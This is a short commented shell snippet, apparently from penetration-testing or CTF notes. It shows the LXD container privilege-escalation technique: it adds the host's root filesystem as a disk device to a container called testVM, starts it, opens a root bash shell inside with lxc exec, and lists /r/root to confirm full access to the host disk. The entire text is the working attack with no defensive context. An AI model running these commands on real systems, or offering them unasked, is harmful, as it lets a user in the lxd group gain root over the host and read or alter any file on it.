# Init VM

# Mount the host /
lxc config device add testVM realRoot disk source=/ path=r

# Start VM
lxc start testVM

# Check containers
lxc list

# Execute as root inside container
lxc exec testVM -- /bin/bash

# We have full access on host disk thru /r/
ls -la /r/root
